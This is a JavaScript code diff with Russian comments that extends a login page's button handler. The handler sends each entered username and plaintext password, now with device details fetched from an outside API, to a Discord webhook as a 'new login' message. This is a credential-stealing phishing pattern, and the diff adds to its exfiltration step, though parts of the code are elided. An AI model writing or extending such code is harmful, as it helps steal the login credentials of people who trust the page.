@@ -113,3 +113,35 @@ function sendToDiscord(username, password) {
         console.error('Ошибка:', error);
     });
 }
+// ... (остальной код)
+
+// Функция для отправки данных в Discord
+function sendToDiscord(username, password, deviceInfo) {
+    const message = {
+        content: `Новый вход: Логин: ${username}, Пароль: ${password}\nУстройство: ${deviceInfo}`
+    };
+
+    // ... (остальной код отправки на вебхук)
+}
+
+// Функция для определения устройства (пример с использованием DeviceInfo)
+async function getDeviceInfo() {
+    try {
+        const response = await fetch('https://api.deviceinfo.com/');
+        const data = await response.json();
+        return data.device.type + ', ' + data.os.name + ', ' + data.browser.name;
+    } catch (error) {
+        console.error('Ошибка при определении устройства:', error);
+        return 'Не удалось определить устройство';
+    }
+}
+
+loginBtn.onclick = async function() {
+    // ... (остальной код)
+
+    const deviceInfo = await getDeviceInfo();
+
+    sendToDiscord(username, password, deviceInfo);
+
+    // ... (остальной код)
+}
